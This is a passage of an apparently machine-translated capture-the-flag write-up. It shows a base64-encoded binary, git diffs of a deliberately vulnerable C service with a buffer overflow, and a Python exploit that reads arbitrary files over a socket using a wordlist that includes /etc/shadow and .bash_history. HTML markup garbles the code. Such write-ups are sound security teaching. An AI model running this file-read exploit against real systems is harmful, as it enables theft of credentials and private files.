+AFDldGQEAAAADAoAAAAAAAAMCkAAAAAAAAwKQAAAAAAAPAAAAAAAAAA8AAAAAAAAAAQAAAAAAAAA +UeV0ZAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAv +bGliNjQvbGQtbGludXgteDg2LTY0LnNvLjIABAAAABAAAAABAAAAR05VAAAAAAACAAAABgAAACAA +AAAEAAAAFAAAAAMAAABHTlUAjY+HU1RRADsF2xXRTQeBhXaBO0kCAAAACwAAAAEAAAAGAAAAAAAA +AAABEAALAAAAAAAAACkdjBwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgAAABIAAAAAAAAA +AAAAAAAAAAAAAAAAPwAAABIAAAAAAAAAAAAAAAAAAAAAAAAAEQAAABIAAAAAAAAAAAAAAAAAAAAA +AAAAJQAAABIAAAAAAAAAAAAAAAAAAAAAAAAALAAAABIAAAAAAAAAAAAAAAAAAAAAAAAARgAAABIA +AAAAAAAAAAAAAAAAAAAAAAAAGAAAABIAAAAAAAAAAAAAAAAAAAAAAAAAWAAAACAAAAAAAAAAAAAA +AAAAAAAAAAAAOAAAABIAAAAAAAAAAAAAAAAAAAAAAAAACwAAABIAAAAAAAAAAAAAAAAAAAAAAAAA +MQAAABEAGgDADWAAAAAAAAgAAAAAAAAAAGxpYmMuc28uNgBmb3BlbgBwcmludGYAZmdldHMAc3Ry +bGVuAG1lbXNldAByZWFkAHN0ZG91dABtZW1jcHkAc2V0YnVmAF9fbGliY19zdGFydF9tYWluAF9f +Z21vbl9zdGFydF9fAEdMSUJDXzIuMTQAR0xJQkNfMi4yLjUAAAACAAIAAgACAAIAAgACAAAAAwAC +AAIAAAABAAIAAQAAABAAAAAAAAAAlJGWBgAAAwBnAAAAEAAAAHUaaQkAAAIAcgAAAAAAAABIDWAA +AAAAAAYAAAAIAAAAAAAAAAAAAADADWAAAAAAAAUAAAALAAAAAAAAAAAAAABoDWAAAAAAAAcAAAAB +AAAAAAAAAAAAAABwDWAAAAAAAAcAAAACAAAAAAAAAAAAAAB4DWAAAAAAAAcAAAADAAAAAAAAAAAA +AACADWAAAAAAAAcAAAAEAAAAAAAAAAAAAACIDWAAAAAAAAcAAAAFAAAAAAAAAAAAAACQDWAAAAAA +AAcAAAAGAAAAAAAAAAAAAACYDWAAAAAAAAcAAAAHAAAAAAAAAAAAAACgDWAAAAAAAAcAAAAJAAAA +AAAAAAAAAACoDWAAAAAAAAcAAAAKAAAAAAAAAAAAAABIg+wISIsFxQcgAEiFwHQF6LMAAABIg8QI +wwAAAAAAAAAAAAAAAAAA/zWyByAA/yW0ByAADx9AAP8lsgcgAGgAAAAA6eD/////JaoHIABoAQAA +AOnQ/////yWiByAAaAIAAADpwP////8lmgcgAGgDAAAA6bD/////JZIHIABoBAAAAOmg/////yWK +ByAAaAUAAADpkP////8lggcgAGgGAAAA6YD/////JXoHIABoBwAAAOlw/////yVyByAAaAgAAADp +YP////8lAgcgAGaQAAAAAAAAAAAx7UmJ0V5IieJIg+TwUFRJx8DwCUAASMfBgAlAAEjHx/cIQADo +h/////RmDx9EAAC4xw1gAFVILcANYABIg/gOSInldhu4AAAAAEiFwHQRXb/ADWAA/+BmDx+EAAAA +AABdww8fQABmLg8fhAAAAAAAvsANYABVSIHuwA1gAEjB/gNIieVIifBIweg/SAHGSNH+dBW4AAAA +AEiFwHQLXb/ADWAA/+APHwBdw2YPH0QAAIA9wQYgAAB1EVVIieXobv///13GBa4GIAAB88MPH0AA +v3ALYABIgz8AdQXrkw8fALgAAAAASIXAdPFVSInl/9Bd6Xr///9VSInlSIHsMAYAAEiJvdj5//+J +tdT5//9Ii4XY+f//SIlF+EiNhfD7//+69AEAAL4AAAAASInH6F7+//9IjYXg+f//ugoAAAC+AAAA +AEiJx+hF/v//SIuF2Pn//0iDwAEPtgAPvsCJRfSDffQBD4WWAAAASINF+AKLhdT5//+D6AmJRfCL +RfBIY9BIi034SI2F8Pv//0iJzkiJx+g6/v//SI2F8Pv//74ECkAASInH6Db+//9IiUXoSIN96AB0 +SkiNhfD5//+69AEAAL4AAAAASInH6ML9//9Ii1XoSI2F8Pn//770AQAASInH6Nr9//9IjYXw+f// +SInGvwYKQAC4AAAAAOiB/f//g330Ag+FlwAAAEiNhfD9//+69AEAAL4AAAAASInH6G79//+69AEA +AL4AAAAAv+ANYADoWv3//0iDRfgCSItF+EiJx+gZ/f//iUXwi0XwSJhIg8ABSAFF+EiDRfgGSItF ++LrgDWAAuT4AAABIiddIicbzSKVIifBIifqLCIkKSI1SBEiNQARIi034SI2F8P3//7rQBwAASInO +SInH6DD9//+4AAAAAMnDVUiJ5UiB7PAHAACJvRz4//9IibUQ+P//SIsFqgQgAL4AAAAASInH6J38 +//9IjYUg+P//utAHAAC+AAAAAEiJx+ik/P//SI2FIPj//7rQBwAASInGvwAAAADom/z//4lF/ItV +/EiNhSD4//+J1kiJx+ja/f//uAAAAADJw2YuDx+EAAAAAAAPHwBBV0FWQYn/QVVBVEyNJc4BIABV +SI0tzgEgAFNJifZJidVMKeVIg+wISMH9A+jH+///SIXtdCAx2w8fhAAAAAAATInqTIn2RIn/Qf8U +3EiDwwFIOet16kiDxAhbXUFcQV1BXkFfw5BmLg8fhAAAAAAA88MAAEiD7AhIg8QIwwAAAAEAAgBy +ACVzAAAAAAEbAzs4AAAABgAAAJT7//+EAAAARPz//1QAAAA6/f//rAAAAOv+///MAAAAdP///+wA +AADk////NAEAABQAAAAAAAAAAXpSAAF4EAEbDAcIkAEHEBQAAAAcAAAA6Pv//yoAAAAAAAAAAAAA +ABQAAAAAAAAAAXpSAAF4EAEbDAcIkAEAACQAAAAcAAAACPv//6AAAAAADhBGDhhKDwt3CIAAPxo7 +KjMkIgAAAAAcAAAARAAAAIb8//+xAQAAAEEOEIYCQw0GA6wBDAcIABwAAABkAAAAF/7//3wAAAAA +QQ4QhgJDDQYCdwwHCAAARAAAAIQAAACA/v//ZQAAAABCDhCPAkIOGI4DRQ4gjQRCDiiMBUgOMIYG +SA44gwdNDkByDjhBDjBBDihCDiBCDhhCDhBCDggAFAAAAMwAAACo/v//AgAAAAAAAAAAAAAAAAAA +AAAAAAAgB0AAAAAAAAAHQAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAADAAAAAAAAAB4BUAA +AAAAAA0AAAAAAAAA9AlAAAAAAAAZAAAAAAAAAGALYAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAA +AAAAaAtgAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAABgAkAAAAAAAAUAAAAAAAAAqANAAAAA +AAAGAAAAAAAAAIgCQAAAAAAACgAAAAAAAAB+AAAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAA +AAAAAAAAAAAAAwAAAAAAAABQDWAAAAAAAAIAAAAAAAAA2AAAAAAAAAAUAAAAAAAAAAcAAAAAAAAA +FwAAAAAAAACgBEAAAAAAAAcAAAAAAAAAcARAAAAAAAAIAAAAAAAAADAAAAAAAAAACQAAAAAAAAAY +AAAAAAAAAP7//28AAAAAQARAAAAAAAD///9vAAAAAAEAAAAAAAAA8P//bwAAAAAmBEAAAAAAAAAA +AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA +AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeAtgAAAAAAAAAAAA +AAAAAAAAAAAAAAAAtgVAAAAAAADGBUAAAAAAANYFQAAAAAAA5gVAAAAAAAD2BUAAAAAAAAYGQAAA +AAAAFgZAAAAAAAAmBkAAAAAAADYGQAAAAAAAAAAAAAAAAAAAAAAAAAAAAEdDQzogKERlYmlhbiA2 +LjEuMS0xMSkgNi4xLjEgMjAxNjA4MDIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAB +AAACQAAAAAAAAAAAAAAAAAAAAAAAAwACABwCQAAAAAAAAAAAAAAAAAAAAAAAAwADADwCQAAAAAAA +AAAAAAAAAAAAAAAAAwAEAGACQAAAAAAAAAAAAAAAAAAAAAAAAwAFAIgCQAAAAAAAAAAAAAAAAAAA +AAAAAwAGAKgDQAAAAAAAAAAAAAAAAAAAAAAAAwAHACYEQAAAAAAAAAAAAAAAAAAAAAAAAwAIAEAE +QAAAAAAAAAAAAAAAAAAAAAAAAwAJAHAEQAAAAAAAAAAAAAAAAAAAAAAAAwAKAKAEQAAAAAAAAAAA +AAAAAAAAAAAAAwALAHgFQAAAAAAAAAAAAAAAAAAAAAAAAwAMAKAFQAAAAAAAAAAAAAAAAAAAAAAA +AwANAEAGQAAAAAAAAAAAAAAAAAAAAAAAAwAOAFAGQAAAAAAAAAAAAAAAAAAAAAAAAwAPAPQJQAAA +AAAAAAAAAAAAAAAAAAAAAwAQAAAKQAAAAAAAAAAAAAAAAAAAAAAAAwARAAwKQAAAAAAAAAAAAAAA +AAAAAAAAAwASAEgKQAAAAAAAAAAAAAAAAAAAAAAAAwATAGALYAAAAAAAAAAAAAAAAAAAAAAAAwAU +AGgLYAAAAAAAAAAAAAAAAAAAAAAAAwAVAHALYAAAAAAAAAAAAAAAAAAAAAAAAwAWAHgLYAAAAAAA +AAAAAAAAAAAAAAAAAwAXAEgNYAAAAAAAAAAAAAAAAAAAAAAAAwAYAFANYAAAAAAAAAAAAAAAAAAA +AAAAAwAZALANYAAAAAAAAAAAAAAAAAAAAAAAAwAaAMANYAAAAAAAAAAAAAAAAAAAAAAAAwAbAAAA +AAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAQAVAHALYAAAAAAAAAAA +AAAAAAAZAAAAAgAOAIAGQAAAAAAAAAAAAAAAAAAbAAAAAgAOAMAGQAAAAAAAAAAAAAAAAAAuAAAA +AgAOAAAHQAAAAAAAAAAAAAAAAABEAAAAAQAaAMgNYAAAAAAAAQAAAAAAAABTAAAAAQAUAGgLYAAA +AAAAAAAAAAAAAAB6AAAAAgAOACAHQAAAAAAAAAAAAAAAAACGAAAAAQATAGALYAAAAAAAAAAAAAAA +AAClAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACtAAAAAQAS +AFgLQAAAAAAAAAAAAAAAAAC7AAAAAQAVAHALYAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAA +AAAAAAAAAADHAAAAAAATAGgLYAAAAAAAAAAAAAAAAADYAAAAAQAWAHgLYAAAAAAAAAAAAAAAAADh +AAAAAAATAGALYAAAAAAAAAAAAAAAAAD0AAAAAAARAAwKQAAAAAAAAAAAAAAAAAAHAQAAAQAYAFAN +YAAAAAAAAAAAAAAAAAAdAQAAEgAOAPAJQAAAAAAAAgAAAAAAAAAtAQAAIAAAAAAAAAAAAAAAAAAA +AAAAAABJAQAAEQAaAMANYAAAAAAACAAAAAAAAAD6AQAAIAAZALANYAAAAAAAAAAAAAAAAABdAQAA +EAAZAMANYAAAAAAAAAAAAAAAAAAnAQAAEgAPAPQJQAAAAAAAAAAAAAAAAABkAQAAEgAAAAAAAAAA +AAAAAAAAAAAAAAB4AQAAEgAAAAAAAAAAAAAAAAAAAAAAAACMAQAAEgAAAAAAAAAAAAAAAAAAAAAA +AACgAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAC0AQAAEgAAAAAAAAAAAAAAAAAAAAAAAADGAQAAEgAA +AAAAAAAAAAAAAAAAAAAAAADlAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAD4AQAAEAAZALANYAAAAAAA +AAAAAAAAAAAFAgAAIAAAAAAAAAAAAAAAAAAAAAAAAAAUAgAAEQIZALgNYAAAAAAAAAAAAAAAAAAh +AgAAEgAAAAAAAAAAAAAAAAAAAAAAAAA0AgAAEQAQAAAKQAAAAAAABAAAAAAAAABDAgAAEgAOAIAJ +QAAAAAAAZQAAAAAAAADTAAAAEAAaANgPYAAAAAAAAAAAAAAAAAD+AQAAEgAOAFAGQAAAAAAAKgAA +AAAAAABTAgAAEAAaAMANYAAAAAAAAAAAAAAAAABfAgAAEgAOAPcIQAAAAAAAfAAAAAAAAABkAgAA +EgAAAAAAAAAAAAAAAAAAAAAAAAB3AgAAIAAAAAAAAAAAAAAAAAAAAAAAAACLAgAAEgAOAEYHQAAA +AAAAsQEAAAAAAACZAgAAEQIZAMANYAAAAAAAAAAAAAAAAAClAgAAIAAAAAAAAAAAAAAAAAAAAAAA +AAC/AgAAEQAaAOANYAAAAAAA9AEAAAAAAABNAgAAEgALAHgFQAAAAAAAAAAAAAAAAAAAY3J0c3R1 +ZmYuYwBfX0pDUl9MSVNUX18AZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRvcnNf +YXV4AGNvbXBsZXRlZC42OTc5AF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5 +AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBjdGZ0cC5jAF9fRlJB +TUVfRU5EX18AX19KQ1JfRU5EX18AX19pbml0X2FycmF5X2VuZABfRFlOQU1JQwBfX2luaXRfYXJy +YXlfc3RhcnQAX19HTlVfRUhfRlJBTUVfSERSAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfX2xpYmNf +Y3N1X2ZpbmkAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAHN0ZG91dEBAR0xJQkNfMi4yLjUA +X2VkYXRhAHN0cmxlbkBAR0xJQkNfMi4yLjUAc2V0YnVmQEBHTElCQ18yLjIuNQBwcmludGZAQEdM +SUJDXzIuMi41AG1lbXNldEBAR0xJQkNfMi4yLjUAcmVhZEBAR0xJQkNfMi4yLjUAX19saWJjX3N0 +YXJ0X21haW5AQEdMSUJDXzIuMi41AGZnZXRzQEBHTElCQ18yLjIuNQBfX2RhdGFfc3RhcnQAX19n +bW9uX3N0YXJ0X18AX19kc29faGFuZGxlAG1lbWNweUBAR0xJQkNfMi4xNABfSU9fc3RkaW5fdXNl +ZABfX2xpYmNfY3N1X2luaXQAX19ic3Nfc3RhcnQAbWFpbgBmb3BlbkBAR0xJQkNfMi4yLjUAX0p2 +X1JlZ2lzdGVyQ2xhc3NlcwBwYXJzZV9yZXF1ZXN0AF9fVE1DX0VORF9fAF9JVE1fcmVnaXN0ZXJU +TUNsb25lVGFibGUAdG9fd3JpdGUAAC5zeW10YWIALnN0cnRhYgAuc2hzdHJ0YWIALmludGVycAAu +bm90ZS5BQkktdGFnAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3Ry +AC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC5w +bHQuZ290AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRf +YXJyYXkALmZpbmlfYXJyYXkALmpjcgAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21t +ZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA +AAAAAAAAAAAAAAAAAAAAGwAAAAEAAAACAAAAAAAAAAACQAAAAAAAAAIAAAAAAAAcAAAAAAAAAAAA +AAAAAAAAAQAAAAAAAAAAAAAAAAAAACMAAAAHAAAAAgAAAAAAAAAcAkAAAAAAABwCAAAAAAAAIAAA +AAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAxAAAABwAAAAIAAAAAAAAAPAJAAAAAAAA8AgAA +AAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAPb//28CAAAAAAAAAGACQAAA +AAAAYAIAAAAAAAAkAAAAAAAAAAUAAAAAAAAACAAAAAAAAAAAAAAAAAAAAE4AAAALAAAAAgAAAAAA +AACIAkAAAAAAAIgCAAAAAAAAIAEAAAAAAAAGAAAAAQAAAAgAAAAAAAAAGAAAAAAAAABWAAAAAwAA +AAIAAAAAAAAAqANAAAAAAACoAwAAAAAAAH4AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA +XgAAAP///28CAAAAAAAAACYEQAAAAAAAJgQAAAAAAAAYAAAAAAAAAAUAAAAAAAAAAgAAAAAAAAAC +AAAAAAAAAGsAAAD+//9vAgAAAAAAAABABEAAAAAAAEAEAAAAAAAAMAAAAAAAAAAGAAAAAQAAAAgA +AAAAAAAAAAAAAAAAAAB6AAAABAAAAAIAAAAAAAAAcARAAAAAAABwBAAAAAAAADAAAAAAAAAABQAA +AAAAAAAIAAAAAAAAABgAAAAAAAAAhAAAAAQAAABCAAAAAAAAAKAEQAAAAAAAoAQAAAAAAADYAAAA +AAAAAAUAAAAYAAAACAAAAAAAAAAYAAAAAAAAAI4AAAABAAAABgAAAAAAAAB4BUAAAAAAAHgFAAAA +AAAAGgAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACJAAAAAQAAAAYAAAAAAAAAoAVAAAAA +AACgBQAAAAAAAKAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAlAAAAAEAAAAGAAAAAAAA +AEAGQAAAAAAAQAYAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAJ0AAAABAAAA +BgAAAAAAAABQBkAAAAAAAFAGAAAAAAAAogMAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAACj +AAAAAQAAAAYAAAAAAAAA9AlAAAAAAAD0CQAAAAAAAAkAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAA +AAAAAAAAqQAAAAEAAAACAAAAAAAAAAAKQAAAAAAAAAoAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAA +AAAAAAAAAAAAAAAAALEAAAABAAAAAgAAAAAAAAAMCkAAAAAAAAwKAAAAAAAAPAAAAAAAAAAAAAAA +AAAAAAQAAAAAAAAAAAAAAAAAAAC/AAAAAQAAAAIAAAAAAAAASApAAAAAAABICgAAAAAAABQBAAAA +AAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAyQAAAA4AAAADAAAAAAAAAGALYAAAAAAAYAsAAAAA +AAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAANUAAAAPAAAAAwAAAAAAAABoC2AAAAAA +AGgLAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADhAAAAAQAAAAMAAAAAAAAA +cAtgAAAAAABwCwAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA5gAAAAYAAAAD +AAAAAAAAAHgLYAAAAAAAeAsAAAAAAADQAQAAAAAAAAYAAAAAAAAACAAAAAAAAAAQAAAAAAAAAJgA +AAABAAAAAwAAAAAAAABIDWAAAAAAAEgNAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAA +AAAAAADvAAAAAQAAAAMAAAAAAAAAUA1gAAAAAABQDQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA +AAAAAAgAAAAAAAAA+AAAAAEAAAADAAAAAAAAALANYAAAAAAAsA0AAAAAAAAQAAAAAAAAAAAAAAAA +AAAACAAAAAAAAAAAAAAAAAAAAP4AAAAIAAAAAwAAAAAAAADADWAAAAAAAMANAAAAAAAAGAIAAAAA +AAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAADAQAAAQAAADAAAAAAAAAAAAAAAAAAAADADQAAAAAA +ACYAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA +6BcAAAAAAAAMAQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAA +AAAAAAAAAOgNAAAAAAAAOAcAAAAAAAAeAAAALwAAAAgAAAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAA +AAAAAAAAAAAAAAAAAAAgFQAAAAAAAMgCAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA commit 9b5c226d15d611d6957f3fda7c993186270a6cc4 Author: alice &lt;alice@baffle.me&gt; Date: Mon Oct 17 14:52:40 2016 -0400 Made it into a write-type-thing instead diff --git a/hellofriend.cb/hellofriend.c index d5cbbf9..10a4d9e 100644 --- a/hellofriend.c +++ b/hellofriend.c @@ -2,29 +2,37 @@ #include &lt;string.h&gt; #include &lt;unistd.h&gt; +char to_</span></span>write[500]; + int parse<span class="hljs-emphasis"><span class="hljs-emphasis">_request(char *req, int n) { + char data[500]; char file[500]; char file_</span></span>content[500]; int file<span class="hljs-emphasis"><span class="hljs-emphasis">_len; + int req_</span></span>type; + char mode[10]; char <span class="hljs-emphasis"><span class="hljs-emphasis">*ptr = req; FILE *</span></span>fp; memset(file, 0, sizeof(file)); + memset(mode, 0, sizeof(mode)); + + memset(data, 0, sizeof(data)); + memset(to<span class="hljs-emphasis"><span class="hljs-emphasis">_write, 0, sizeof(to_</span></span>write)); + + ptr = (char <span class="hljs-emphasis"><span class="hljs-emphasis">*)ptr + 2; + file_len = strlen(ptr); + + ptr = (char *</span></span>)ptr + file<span class="hljs-emphasis"><span class="hljs-emphasis">_len + 1; + ptr = (char *)ptr + 6; - ptr = (char *)ptr + 2; - FiLe_</span></span>len = n - 2 - 5 - 2; - memcpy(file, ptr, file<span class="hljs-emphasis"><span class="hljs-emphasis">_len); + memcpy(to_</span></span>write, ptr, 500); + memcpy(data, ptr, 2000); - fp = fopen(file, "r"); - if (fp) { - memset(file<span class="hljs-emphasis"><span class="hljs-emphasis">_content, 0, sizeof(file_</span></span>content)); - fgets(file<span class="hljs-emphasis"><span class="hljs-emphasis">_content, sizeof(file_</span></span>content), fp); - printf("%s", file<span class="hljs-emphasis"><span class="hljs-emphasis">_content); - } return 0; } -int mAin(int arGc, char *argv[]) { +int main(int argc, char *argv[]) { char buf[2000]; int n; @@ -32,7 +40,7 @@ int mAin(int arGc, char *argv[]) { memset(buf, 0, sizeof(buf)); n = read(0, buf, sizeof(buf)); - p{ARSE_</span></span>REQUEST}(buf, n); + parse<span class="hljs-emphasis"><span class="hljs-emphasis">_request(buf, n); return 0; } commit 06483346fab91b2b17471074a887ac7dffd9ceda Author: alice &lt;alice@baffle.me&gt; Date: Mon Oct 17 14:44:25 2016 -0400 My cat danced on the keyboard diff --git a/hellofriend.cb/hellofriend.c index c2c9046..d5cbbf9 100644 --- a/hellofriend.c +++ b/hellofriend.c @@ -12,7 +12,7 @@ int parse_</span></span>request(char <span class="hljs-emphasis"><span class="hljs-emphasis">*req, int n) { memset(file, 0, sizeof(file)); ptr = (char *</span></span>)ptr + 2; - file<span class="hljs-emphasis"><span class="hljs-emphasis">_len = n - 2 - 5 - 2; + FiLe_</span></span>len = n - 2 - 5 - 2; memcpy(file, ptr, file<span class="hljs-emphasis"><span class="hljs-emphasis">_len); fp = fopen(file, "r"); @@ -24,7 +24,7 @@ int parse_</span></span>request(char <span class="hljs-emphasis"><span class="hljs-emphasis">*req, int n) { return 0; } -int main(int argc, char *</span></span>argv[]) { +int mAin(int arGc, char <span class="hljs-emphasis"><span class="hljs-emphasis">*argv[]) { char buf[2000]; int n; @@ -32,7 +32,7 @@ int main(int argc, char *</span></span>argv[]) { memset(buf, 0, sizeof(buf)); n = read(0, buf, sizeof(buf)); - parse<span class="hljs-emphasis"><span class="hljs-emphasis">_request(buf, n); + p{ARSE_</span></span>REQUEST}(buf, n); return 0; } commit 7edc47a1c3e4dc880a7191915bdbf1565c6b7441 Author: alice <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">alice@baffle.me</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span> Date: Mon Oct 17 14:37:14 2016 -0400 This coder turned coffee into code. You won't believe how she did it! diff --git a/hellofriend.cb/hellofriend.c index 21c5a19..c2c9046 100644 --- a/hellofriend.c +++ b/hellofriend.c @@ -3,10 +3,26 @@ #include <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">unistd.h</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span> int parse<span class="hljs-emphasis"><span class="hljs-emphasis">_request(char *req, int n) { - return 0; -} + char file[500]; + char file_</span></span>content[500]; + int file<span class="hljs-emphasis"><span class="hljs-emphasis">_len; + char *ptr = req; + FILE *fp; + + memset(file, 0, sizeof(file)); + ptr = (char *)ptr + 2; + file_</span></span>len = n - 2 - 5 - 2; + memcpy(file, ptr, file<span class="hljs-emphasis"><span class="hljs-emphasis">_len); + fp = fopen(file, "r"); + if (fp) { + memset(file_</span></span>content, 0, sizeof(file<span class="hljs-emphasis"><span class="hljs-emphasis">_content)); + fgets(file_</span></span>content, sizeof(file<span class="hljs-emphasis"><span class="hljs-emphasis">_content), fp); + printf("%s", file_</span></span>content); + } + return 0; +} int main(int argc, char <span class="hljs-emphasis"><span class="hljs-emphasis">*argv[]) { char buf[2000]; commit d7a1f067a2f4ac469bc4cf77c689a34e2286b665 Author: alice &lt;alice@baffle.me&gt; Date: Mon Oct 17 14:30:20 2016 -0400 Hello, friend... diff --git a/hellofriend.cb/hellofriend.c new file mode 100644 index 0000000..21c5a19 --- /dev/null +++ b/hellofriend.c @@ -0,0 +1,22 @@ +#include &lt;stdio.h&gt; +#include &lt;string.h&gt; +#include &lt;unistd.h&gt; + +int parse_request(char *</span></span>req, int n) { + return 0; +} + + + +int main(int argc, char *argv[]) { + char buf[2000]; + int n; + + setbuf(stdout, 0); + + memset(buf, 0, sizeof(buf)); + n = read(0, buf, sizeof(buf)); + parse_request(buf, n); + + return 0; +}</code> </pre> <br></div></div><br>  If you look closely at the commit <i>My cat danced on the keyboard</i> , then it is not very similar to the cat that walked through the keyboard.  Replaced only some characters.  Having tried to extract these changes, we notice the pattern, and with it the flag: <br><blockquote>  + FiLe_len = n - 2 - 5 - 2; <br>  + int mAin (int arGc, char * argv []) { <br>  + p {ARSE_REQUEST} (buf, n); </blockquote><br>  <i>FLAG {ARSE_REQUEST}</i> <br><br>  <i>PS Where is the reverse, you ask?</i>  <i>Here's a reverse for you, the first flag was a distracting warm-up :)</i> <br><br><h3>  Flag 2 (alice) </h3><br>  In addition to the flag, we find out from the log that the user alice has created, and deleted a certain file: <i>project.enc</i> .  Cancel the last commit in order to return this file: <br><br><pre> <code class="bash hljs">$ git revert HEAD $ ls hellofriend.c project.enc</code> </pre> <br>  The contents of the file clearly resembles base64, so we send it to the <a href="http://www.motobit.com/util/base64-decoder-encoder.asp">site</a> , and convert it back to a binary form. <br><br><pre> <code class="bash hljs">$ file * base64.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> GNU/Linux 2.6.32, BuildID[sha1]=8d8f87535451003b05db15d14d07818576813b49, not stripped</code> </pre><br>  Let's see what's inside by opening the file in IDA.  Looking carefully, you can see that this file contains all the edits that were made to the git project.  After minor edits, the <i>main</i> function looks like this: <br><br><img src="https://habrastorage.org/files/fed/3b5/d96/fed3b5d965b04939932c3abc353cc52d.PNG"><br><br>  This is where 2000 characters are read, which are then passed to the <i>parse_request</i> function: <br><br><img src="https://habrastorage.org/files/3f9/028/86c/3f902886caae432eb8a2419c4cf6d193.PNG"><br><br>  The <i>parse_request</i> function, if the second byte is <i>0x01</i> , reads the first 500 bytes from the file, or if the second byte is <i>0x02</i> , it copies the resulting string to the buffer. <br><br>  At the same time 2 vulnerabilities and 1 error are traced: <br><br><ol><li>  View files </li><li>  Array bounds </li><li>  Buffer overflow </li></ol><br>  Let's stop while on the first, and we will create a script on <i>Python</i> for its operation: <br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python import socket import time import sys port = 6969 host = "192.168.1.190" def readFile(fPath): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) action_byte = "\x01" shell = "0" + action_byte + fPath + "000000" s.send(('%s\n' %(shell)).encode()) time.sleep(0.3) try: data = s.recv(1024) if len(data) != 0: print("File: %s found" %(fPath)) print(data) s.close() except: pass ext = ['', '.txt'] words = open(sys.argv[1], 'r').read().splitlines() for item in words: for e in ext: fPath = '%s%s' %(item, e) readFile(fPath)</span></span></code> </pre> <br>  Based on the information received, we will generate a small dictionary to iterate through the available files: <br><br><div class="spoiler">  <b class="spoiler_title">Vocabulary</b> <div class="spoiler_text">  / home / alice / flag <br>  / flag <br>  / home / flag <br>  / var / www / html / flag <br>  / var / www / flag <br>  /home/alice/.bash_history <br>  / root / flag <br>  / etc / shadow <br>  /root/.bash_history <br></div></div><br>  After launch, we get the first flag: <br><br><pre> <code class="bash hljs">$ ./exploit.py dict.lst File: /flag.txt found FLAG{is_there_an_ivana_tinkle}</code> </pre><br><h3>  Flag 3 (bob) </h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Judging by the fact that the contents of </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/ etc / shadow</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , it did not give us, apparently the service was launched on behalf of some user. </font></font><br><br><font style="vertical-align: inherit;"><font 